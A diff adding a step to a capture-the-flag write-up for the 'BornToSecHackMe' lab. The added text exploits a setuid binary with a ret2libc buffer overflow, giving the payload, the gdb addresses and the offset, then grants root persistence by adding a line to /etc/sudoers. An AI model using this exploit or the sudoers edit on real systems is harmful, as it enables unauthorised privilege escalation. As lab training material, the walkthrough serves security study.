@@ -321,3 +321,42 @@ the challenge say we have to "digest the password"
 so we will hash the password with 'Message digest5' (MD5)
 
 MD5 slash -> 646da671ca01bb5d84dbb5fb2238dc8e
+
+now that we have zaz password we connect to his session
+and what we see there is a binary named exploit_me, with shared uid from root
+we run it normally and it just print the argument 
+
+	$ strings ./exploit_me
+	...
+	strcpy
+	...
+
+we try to crash the program 
+
+	$ ./exploit_me $(python -c 'print("A"*500)')
+	segfault
+we find the offset is 140
+we need to find the address of the system 
+
+	(gdb) p system
+	$5 = {<text variable, no debug info>} 0xb7e6b060 <system>
+	(gdb) p exit
+	$6 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+	(gdb) find 0xb7e2b000,+99999999,"/bin/sh"
+	0xb7f8cc58
+
+now we can run our exploit !
+
+	./exploit_me $(python -c 'print("\x90"*140+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7")')
+
+now we have a shell with Root right , but when i use id command i am still zaz
+so what i will do is :
+
+	$vim /etc/sudoers
+	i add : zaz ALL=(ALL:ALL) ALL
+then i exit the shell and run 
+
+	zaz@BornToSecHackMe:~$ sudo su
+	[sudo] password for zaz: 
+
+i enter zaz password and im root
